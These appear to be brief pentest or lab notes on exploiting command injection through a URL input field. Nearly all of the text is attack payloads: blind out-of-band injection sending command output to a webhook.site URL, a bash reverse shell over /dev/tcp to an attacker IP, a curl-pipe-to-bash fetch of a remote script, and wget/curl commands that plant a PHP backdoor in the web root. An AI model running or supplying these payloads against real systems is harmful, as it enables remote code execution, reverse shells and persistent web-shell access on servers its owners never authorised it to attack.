If its blind, try to use an Out-Of-Bound technique

use webhook! (needs a vpn for some reason in my country)

Here is an example of that payload


```
https://webhook.site/a921c6f2-09bf-45bb-83ac-12fd1d6eeb1f?`pwd`
https://webhook.site/a921c6f2-09bf-45bb-83ac-12fd1d6eeb1f?`id`
https://webhook.site/a921c6f2-09bf-45bb-83ac-12fd1d6eeb1f?`ls`
```

# Reverse shell

## Using bash shell

Creating the shell

```bash
#!/bin/bash
sh -i >& /dev/tcp/192.168.68.128/9001 0>&1
```

```
https://google.com/ && curl http://192.168.68.128:8000/stuff.sh|bash
```


## Using PHP backdoor

 this is now an outdated payload do **NOT** use it it is **NON-FUNCTIONAL PAYLOAD**
```
wget https://tcm-sec.com/ \n wget 192.168.68.128:8000/test
```


These are working payload

```
https://tcm-sec.com/ && curl http://192.168.68.128:8000/stuff.php > /var/www/html/rev.php   
```

```
https://tcm-sec.com/ \n wget -o http://192.168.68.128:8000/stuff.php /var/www/html/rev2.php
```
